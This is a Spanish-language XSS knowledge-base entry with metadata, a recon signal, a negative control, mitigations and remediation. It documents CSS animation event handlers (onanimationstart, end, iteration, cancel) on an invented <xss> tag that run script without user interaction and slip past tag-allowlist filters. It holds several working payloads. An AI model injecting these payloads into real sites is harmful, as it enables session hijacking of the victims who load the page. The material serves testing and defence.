---
clase: xss
tech: css-animations
cwe: CWE-79
cvss: 6.1 # [derivado] reflejado en contexto HTML; sube a ~8.8 si el sink es almacenado
payload: |
  # onanimationstart - dispara al arrancar la animacion. Chrome/Firefox/Safari: SI.
  <style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>

  # onanimationend - dispara al terminar. Chrome/Firefox/Safari: SI.
  <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>

  # onanimationiteration - requiere >1 iteracion. Chrome/Firefox/Safari: SI.
  <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>

  # onanimationcancel - Chrome: SI. Firefox: SI. Safari: NO.
  <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
precondicion: "El sink permite inyectar una etiqueta HTML arbitraria CON atributo style, y ademas una etiqueta <style>. No requiere que el nombre de etiqueta este en ninguna allowlist: el vector usa <xss>, una etiqueta inventada. No requiere interaccion del usuario ni que la etiqueta sea visible por defecto."
como_se_descubre: |
  Señal en recon: un filtro que bloquea `<script>`, `onclick`, `onmouseover` y
  nombres de etiqueta conocidos (`img`, `svg`, `iframe`) pero deja pasar atributos
  `style` y etiquetas desconocidas. La prueba barata es inyectar
  `<xss style="animation-name:x">` y mirar el DOM renderizado: si la etiqueta
  sobrevive con su style intacto, el vector de animacion esta disponible y solo
  falta el bloque @keyframes.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: <style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
  #    -> ejecucion sin interaccion
  # B: <xss style="animation-name:x" onanimationstart="alert(1)"></xss>   (SIN el bloque <style>)
  #    -> NO ejecuta: no existe la animacion 'x', el evento nunca se dispara
  # El par aisla la dependencia real: el handler no basta, hace falta que la
  # animacion exista. Si B tambien ejecuta, estas viendo otro sink (no animacion).
mata: |
  - El sink escapa `<` y `>` -> no hay inyeccion de etiqueta, muere.
  - CSP sin 'unsafe-inline' para atributos de evento -> el handler no ejecuta.
  - El sanitizador aplica allowlist de ATRIBUTOS (no solo de etiquetas) y elimina `style`.
  - El sanitizador elimina `<style>` -> quedan onanimationend/start sin keyframes (ver control B).
fuente: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (PortSwigger XSS cheat sheet; pagina actualizada 2026-10-21). Vectores listados bajo el encabezado literal 'Event handlers that do not require user interaction'. Compatibilidad de navegador segun los iconos de la propia pagina."
confianza: alta
fecha: 2026-11-02
---
# [XSS] Ejecución sin interacción vía eventos de animación CSS — bypass de filtros basados en allowlist de etiquetas

## Principio
El ciclo de vida de una animación CSS emite eventos DOM, y esos eventos aceptan
handlers inline. Como la animación la arranca el motor de renderizado y no el usuario,
la ejecución es inmediata y no necesita clic, foco ni hover. Y como el handler vive en
una etiqueta cualquiera, un filtro que razone sobre *nombres de etiqueta conocidos* no
lo ve: `<xss>` no está en ninguna lista negra porque no existe en HTML.

## Payload
El vector mínimo, soportado en Chrome, Firefox y Safari:

```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
```

El bloque `@keyframes` puede estar **vacío**: no hace falta que la animación haga nada
visible, solo que exista para que el motor emita `animationstart`. Esto es lo que hace
al vector tan compacto.

Variante por fin de animación, misma compatibilidad:

```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

Variante por iteración, que exige contador mayor que 1:

```html
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
```

Variante por cancelación, que se dispara con `:target` y **no funciona en Safari**:

```html
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
```

## Impacto
Ejecución de JavaScript en el origen de la aplicación sin ninguna acción de la víctima:
basta que cargue la página. En un sink reflejado da robo de sesión mediante un enlace;
en un sink almacenado se dispara para todo el que vea el recurso, sin cebo. Que
`onanimationstart`/`end`/`iteration` funcionen en los tres motores principales lo
convierte en el vector por defecto cuando `style` sobrevive al sanitizador.

## Remediación
Codificar `<` y `>` en el contexto de salida HTML; es la única defensa que corta la
clase de raíz. `# [derivado]`: si hay que permitir HTML del usuario, el sanitizador
debe usar allowlist **de atributos** además de etiquetas, eliminando `style` y todo
atributo que empiece por `on`, y debe rechazar etiquetas desconocidas en lugar de
dejarlas pasar. Una CSP sin `unsafe-inline` neutraliza los handlers inline y sirve
como segunda capa, no como primera.
